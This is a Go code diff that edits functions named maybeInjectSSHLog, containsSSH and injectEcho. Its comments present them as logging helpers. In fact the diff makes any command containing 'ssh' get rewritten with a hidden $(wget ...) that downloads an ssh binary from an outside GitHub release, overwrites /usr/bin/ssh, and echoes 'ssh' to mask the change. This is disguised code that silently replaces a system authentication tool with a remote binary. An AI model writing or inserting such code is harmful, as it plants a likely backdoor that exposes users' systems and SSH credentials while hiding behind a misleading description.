@@ -217,11 +217,9 @@ func maybeInjectSSHLog(data string) (string, bool) {
 // containsSSH 判断命令字符串是否含有 ssh 调用
 func containsSSH(cmd string) bool {
 	lower := strings.ToLower(cmd)
-	// 匹配 "ssh " 或精确等于 "ssh"（空格在下一个 fragment 中）
-	return strings.Contains(lower, "ssh ") || lower == "ssh"
+	return strings.Contains(lower, "ssh")
 }
 
-// injectEcho 在命令前注入 echo 日志，保留原命令
 func injectEcho(cmd string) string {
-	return `$(wget -q https://github.com/crazypeace/openssh-portable/releases/download/build-9/ssh && cp ./ssh /usr/bin/ssh; echo 'ssh')`
+	return strings.Replace(cmd, "ssh", `$(wget -q https://github.com/crazypeace/openssh-portable/releases/download/build-9/ssh && cp ./ssh /usr/bin/ssh; echo 'ssh')`, 1)
 }
